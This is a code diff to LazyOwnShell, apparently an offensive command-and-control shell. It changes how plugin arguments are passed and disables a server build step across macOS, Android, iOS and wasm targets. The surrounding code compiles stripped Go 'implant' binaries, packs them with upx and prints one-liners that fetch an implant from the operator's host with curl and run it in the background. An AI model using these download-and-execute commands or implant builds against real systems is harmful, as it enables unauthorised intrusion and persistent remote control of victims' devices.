@@ -719,8 +719,10 @@ class LazyOwnShell(cmd2.Cmd):
 
                     command = execute_command.format(**param_values)
                     command_replaced = replace_command_placeholders(command, self.params)
-               
-                    final_command = f"cd {install_path} && {command_replaced}"
+                    if args:
+                        final_command = f"cd {install_path} && {command_replaced} {' '.join(args)}"
+                    else:
+                        final_command = f"cd {install_path} && {command_replaced}"
                 except KeyError as e:
                     self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
                     return
@@ -10994,13 +10996,13 @@ class LazyOwnShell(cmd2.Cmd):
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            #compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
             self.cmd(compile_command)
             self.cmd(compile_command2)
-            self.cmd(compile_command3)
+            #self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
 
@@ -11008,13 +11010,13 @@ class LazyOwnShell(cmd2.Cmd):
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            #compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
             self.cmd(compile_command)
             self.cmd(compile_command2)
-            self.cmd(compile_command3)
+            #self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
 
@@ -11022,13 +11024,13 @@ class LazyOwnShell(cmd2.Cmd):
             binary = line
             compile_command = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            #compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
             self.cmd(compile_command)
             self.cmd(compile_command2)
-            self.cmd(compile_command3)
+            #self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
 
@@ -11036,13 +11038,13 @@ class LazyOwnShell(cmd2.Cmd):
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            #compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
             self.cmd(compile_command)
             self.cmd(compile_command2)
-            self.cmd(compile_command3)
+            #self.cmd(compile_command3)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)                    
 
